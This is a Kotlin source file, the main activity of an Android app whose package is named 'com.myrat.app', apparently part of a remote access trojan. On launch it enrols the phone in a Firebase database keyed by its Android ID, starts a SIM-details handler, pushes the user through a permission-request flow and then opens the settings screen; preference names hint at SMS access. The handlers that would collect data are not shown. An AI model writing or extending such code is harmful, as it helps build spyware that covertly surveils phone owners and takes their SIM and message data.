package com.myrat.app

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.handler.PermissionHandler
import com.myrat.app.handler.SimDetailsHandler
import com.myrat.app.utils.Logger
import java.util.UUID

class MainActivity : AppCompatActivity() {
    private lateinit var deviceId: String
    private lateinit var simDetailsHandler: SimDetailsHandler
    private lateinit var permissionHandler: PermissionHandler
    private lateinit var deviceRef: com.google.firebase.database.DatabaseReference
    private var doubleBackToExitPressedOnce = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            setContentView(R.layout.activity_main)
            Logger.log("MainActivity onCreate, isFinishing: $isFinishing, isDestroyed: $isDestroyed")
        } catch (e: Exception) {
            Logger.error("Crash in onCreate: ${e.message}", e)
            Toast.makeText(this, "Error loading UI: ${e.message}", Toast.LENGTH_LONG).show()
            finish()
            return
        }

        deviceId = getDeviceId(this)
        deviceRef = Firebase.database.getReference("Device").child(deviceId)
        simDetailsHandler = SimDetailsHandler(this, deviceId)
        permissionHandler = PermissionHandler(this, simDetailsHandler)

        checkAndCreateDeviceNode()
        Logger.log("Requesting permissions via PermissionHandler...")
        permissionHandler.requestPermissions()
    }

    private fun checkAndCreateDeviceNode() {
        deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) {
                    deviceRef.child("createdAt").setValue(ServerValue.TIMESTAMP)
                        .addOnSuccessListener {
                            Log.d("Firebase", "Created new device node: $deviceId")
                        }
                        .addOnFailureListener { e ->
                            Log.e("FirebaseError", "Failed to create device node: ${e.message}")
                        }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("FirebaseError", "Error checking device node: ${error.message}")
            }
        })
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        Logger.log("onRequestPermissionsResult called, delegating to PermissionHandler")
    }

    override fun onResume() {
        super.onResume()
        Logger.log("MainActivity onResume")
        if (isFinishing || isDestroyed) {
            Logger.error("MainActivity is finishing or destroyed, skipping onResume")
            return
        }
        try {
            permissionHandler.handleResume()
            checkAndOpenPhoneSettings()
        } catch (e: Exception) {
            Logger.error("Crash in onResume: ${e.message}", e)
            Toast.makeText(this, "Error in onResume: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun checkAndOpenPhoneSettings() {
        Logger.log("Checking if all permissions are granted to open phone settings")
        val allPermissionsGranted = permissionHandler.areAllPermissionsGranted()
        if (allPermissionsGranted) {
            Logger.log("All permissions granted, opening phone settings")
            openPhoneSettings()
        } else {
            Logger.log("Not all permissions granted yet, skipping phone settings")
        }
    }

    private fun openPhoneSettings() {
        try {
            val intent = Intent(Settings.ACTION_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
            }
            startActivity(intent)
            Logger.log("Phone settings opened successfully")
        } catch (e: Exception) {
            Logger.error("Error opening phone settings: ${e.message}", e)
            Toast.makeText(this, "Unable to open settings", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed()
            finish()
            return
        }
        doubleBackToExitPressedOnce = true
        Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show()
        Handler(Looper.getMainLooper()).postDelayed({ doubleBackToExitPressedOnce = false }, 2000)
    }

    companion object {
        fun getDeviceId(context: Context): String {
            val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
            var deviceId = prefs.getString("deviceId", null)
            if (deviceId == null) {
                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                deviceId = androidId ?: UUID.randomUUID().toString()
                prefs.edit().putString("deviceId", deviceId).apply()
                Logger.log("Generated new deviceId: $deviceId")
            }
            return deviceId
        }
    }
}